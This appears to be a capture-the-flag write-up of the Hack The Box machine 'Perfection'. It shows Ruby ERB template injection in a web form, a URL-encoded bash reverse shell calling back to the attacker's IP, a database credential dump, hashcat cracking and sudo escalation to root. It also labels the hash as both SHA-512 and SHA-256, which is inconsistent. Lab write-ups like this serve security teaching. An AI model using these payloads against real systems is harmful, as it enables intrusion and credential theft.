---
title: "Perfection from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Perfection from HTB
[page](https://app.hackthebox.com/machines/Perfection)
`Nmap`gave this:
```bash
$ nmap -sCV --min-rate 4000 10.10.11.253
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 17:20 +04
Nmap scan report for 10.10.11.253
Host is up (0.29s latency).
Not shown: 931 filtered tcp ports (no-response), 67 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nothing unusual.
Access the site and then go to `Calculate your weighted grade`. We have to modify something with `BurpSuite`.
Turn on `BurpSuite`and `Intercept`. Go to the site and submit it:
![](/assets//images/Screenshot from 2024-08-07 17-25-48.png]]
Submit it and try to modify it with `Intercept`:
```

category1= <%25%2d+%22>1&grade1=20&weight1=20&category2=2&grade2=20&weight2=20&category3=3&grade3=20&weight3=20&category4=4&grade4=20&weight4=20&category5=5&grade5=20&weight5=20
```
`<%25%2d+%22>`i added this and site displayed this : ![](/assets/images/Screenshot from 2024-08-07 17-35-42.png)
So we can add some codes to mess with it.
For first try send it to `Repeater`, use this command and `url encode`it with `burpsuite`.
```
<%= IO.popen("sleep 10").readlines() %>1 # url encode it with CTRL+u
<%25%3d+IO.popen("sleep+10").readlines()+%25>1
```
`note that 1 is category name and don't need encoding.`
This code should make site sleep for 10 seconds. If request is delayed for 10 seconds that means this code worked.
As expected it returned after 10 seconds.
Now we need `reverse shell`to access the machine. we'll use this code:
```
<%= IO.popen("bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'").readlines() %> # url encode it
<%25%3d+IO.popen("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.3/1234+0>%261'").readlines()+%25>
```
It should look like this:
```
category1=<%25%3d+IO.popen("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.3/1234+0>%261'").readlines()+%25>1
```
Open port with `NetCat`and wait for the connection after clicking `send`.
```bash
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.253] 40564
sh: 0: can't access tty; job control turned off
$ ls
main.rb
public
views
$ script /dev/null -c bash
Script started, output log file is '/dev/null'. # to get shell
$ cat /home/susan/user.txt
7e3540188bf162aefb968d344a6bad4d
```
***
User Flag is : 7e3540188bf162aefb968d344a6bad4d
***
Check for `mail`in `/var/mail`directory and read it.
```bash
$ cat susan
cat susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```
Our user is `susan`and according to mail our password should start with `susan_nasus`and some number.
When you type `id`in terminal you see this:
```
susan@perfection:~$ id uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```
We see that the user `susan` is in the `sudo`group. Since `sudo` requires a password, we need to find the password for the `susan` user. Go to `/home/susan`and you can find file named `Migration`:
```bash
susan@perfection: cd Migration/
susan@perfection:~/Migration$ ls
pupilpath_credentials.db
susan@perfection:~/Migration$ file pupilpath_credentials.db
pupilpath_credentials.db: SQLite 3.x database
sqlite3 pupilpath_credentials.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
users
sqlite> select * from users;
select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```
Save this hash `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`and with `hash-identifier`identify hash type. It is `sha-512`.
password should start with `susan_nasus_` save that to file `e.g. help`
save hash to file `e.g. hash`
and run the command:
```
hashcat -m 1400 -a 6 hash help ?d?d?d?d?d?d?d?d?d -O
```
###### -m 1400 : Specifies the hash type, in this case, SHA-256.
###### -a 6 : Specifies the attack mode, in this case, a combinator attack where each candidate in the keyspace is appended to each word in the wordlist.
###### hash : The file containing the hash to be cracked.
###### help : The wordlist file containing the prefix susan_nasus_ .
###### ?d?d?d?d?d?d?d?d?d : The mask representing all combinations of 9 digits.
###### -O : Optimized kernel (useful for speed but may have restrictions).

And the cracked password is: `susan_nasus_413759210`
After that become the root:
```bash
$ sudo -i
sudo -i
[sudo] password for susan: susan_nasus_413759210

root@perfection:~# cat root.txt
cat root.txt
854f91d2002cf7e31b4df4359c70a336
```
***
Root Flag is: 854f91d2002cf7e31b4df4359c70a336
***
![](/assets/images/Screenshot from 2024-08-07 16-48-05.png)
